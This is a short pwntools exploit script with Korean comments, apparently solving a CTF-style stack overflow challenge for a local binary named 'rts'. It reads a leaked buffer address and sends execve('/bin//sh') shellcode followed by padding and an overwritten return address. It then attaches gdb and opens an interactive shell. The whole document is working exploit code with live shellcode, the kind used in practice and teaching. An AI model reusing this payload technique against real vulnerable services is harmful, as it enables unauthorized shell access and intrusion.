from pwn import *

# 연결 (실제 대회때는 서버에 연결하니 process가 아니라 remote를 써야함)
p = process("./rts")
context.log_level = "debug"

# 쉘코드 정의
shellcode = (b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05")

# 버퍼 주소 읽어서 사용 (문제 c코드에서 출력해줌)
p.recvuntil(b"[+] buffer address : ")
ra = int(p.recv(14), 16)

#리턴 주소
return_address = ra

# 대기 메세지 처리
p.recvuntil(b"Input : ")

# 페이로드 구성
payload = shellcode
payload += b'A' * (0x20 - len(shellcode))
payload += b'B' * 0x8
payload += p64(ra) #return_address

# 페이로드 전송
gdb.attach(p)
p.send(payload)

# 쉘을 실행하여 결과 확인
p.interactive()
